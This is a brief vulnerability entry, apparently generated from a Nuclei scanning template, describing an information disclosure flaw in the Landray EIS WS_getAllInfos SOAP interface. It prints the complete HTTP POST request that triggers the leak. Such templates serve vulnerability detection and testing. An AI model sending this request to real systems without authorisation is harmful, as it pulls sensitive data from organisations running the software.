# Vulnerability: Landray EIS WS_getAllInfos - Information Disclosure
**Classification:** LANDRAY
**Source:** Nuclei Template (`landray-eis-ws-infoleak.yaml`)

## Description
Landray EIS WS_getAllInfos interface suffers from a sensitive information disclosure vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /WS/Basic/Basic.asmx HTTP/1.1
Content-Type: text/xml
Host: {{Hostname}}

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:WS_getAllInfos/>
</soapenv:Body>
</soapenv:Envelope>
```

